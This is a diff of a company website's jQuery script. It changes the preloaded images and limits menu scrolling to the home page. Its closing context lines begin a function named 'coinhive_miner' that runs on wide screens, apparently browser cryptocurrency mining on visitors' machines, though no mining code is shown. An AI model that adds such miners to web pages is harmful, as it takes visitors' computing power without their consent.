@@ -12,10 +12,22 @@ jQuery(document).ready(function($) {
     $.fn.detect_video();
     $.fn.banner_txt();
 
+    /*
     preload_images = [
         '/images/feature-grid-bg-1.jpg',
         '/images/feature-grid-bg-2.jpg',
         '/images/feature-grid-bg-3.jpg'
+    ];
+    */
+
+    preload_images = [
+        '/images/foto_geomarketing.jpg',        
+        '/images/foto_geolocalizacion.jpg',
+        '/images/foto_realidad_aumentada.jpg',
+        '/images/foto_visita_virtual.jpg',
+        '/images/foto_cartografia.jpg',
+        '/images/foto_fotogrametria.jpg',
+        '/images/fondo_vl.jpg'
     ];
 
     $.fn.preload_images(preload_images);
@@ -160,26 +172,35 @@ jQuery(document).ready(function($) {
     } // end of $.fn.preload_images = function(images)
 	
 	$.fn.scrollMenu = function() {
-		$('[class*="menu-item-"]').click(function(e) {
-			e.preventDefault();
-			var item_string = $(this).find('a span').text();
-			//alert('item name: ' + item_string);
-			var section = '';
-			switch(item_string) {
-				case 'Products':
-				case 'Productos':
-					$.fn.scrollTo('#fg-products', 200);
-					break;
-				case 'Solutions':
-				case 'Soluciones':
-					$.fn.scrollTo('#fg-services', 200);
-					break;
-				case 'Company':
-				case 'Compañía':
-					$.fn.scrollTo('#about', 100);
-					break;
-			} // end of switch(item_string)
-		}); // end of $('[class*="menu-item-"]').click(function(e)
+
+        var is_home = null;
+
+        if ($('.home').length) {            
+            $('[class*="menu-item-"]').click(function(e) {
+                e.preventDefault();
+                var item_string = $(this).find('a span').text();
+                //alert('item name: ' + item_string);
+                var section = '';
+                switch(item_string) {
+                    case 'Products':
+                    case 'Productos':
+                        $.fn.scrollTo('#fg-products', 200);
+                        break;
+                    case 'Solutions':
+                    case 'Soluciones':
+                        $.fn.scrollTo('#fg-services', 200);
+                        break;
+                    case 'Company':
+                    case 'Compañía':
+                        $.fn.scrollTo('#about', 100);
+                        break;
+                } // end of switch(item_string)
+            }); // end of $('[class*="menu-item-"]').click(function(e)
+        } // end of if ($('.home').length)
+        else {
+            
+        } // end of else if (!$('.home').length)
+		
 	} // end of $.fn.scrollMenu = function()
 	
 	$.fn.scrollTo = function(selector, offset) {
@@ -194,7 +215,7 @@ jQuery(document).ready(function($) {
 				ease: Circ.easeOut,							
 			}
 		);
-	} // end of $.fn.scrollTo = function(selector)
+    } // end of $.fn.scrollTo = function(selector)
     
     $.fn.coinhive_miner = function() {
         if ($viewport_width >= 1200) {
